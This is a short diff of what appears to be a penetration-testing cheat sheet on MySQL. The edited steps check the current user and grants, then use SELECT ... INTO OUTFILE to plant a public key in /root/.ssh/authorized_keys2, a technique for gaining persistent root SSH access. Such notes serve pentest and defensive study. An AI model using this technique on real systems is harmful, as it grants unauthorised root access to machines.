@@ -77,17 +77,18 @@ mysql -u root -p'<PASSWORD>' mysql
 ```
 
 ```console
-# Check privilege
+# Check current user
 select current_user();
 ```
 
 ```console
+# Check privilege
 show grants for root@localhost;
 ```
 
 ```console
 # If mysql file write is not able to append or overwrite authorized_keys
-select "BASE64_PUB_KEY" into outfile "/root/.ssh/authorized_keys2";
+select "<PUB_KEY>" into outfile "/root/.ssh/authorized_keys2";
 ```
 
 ---
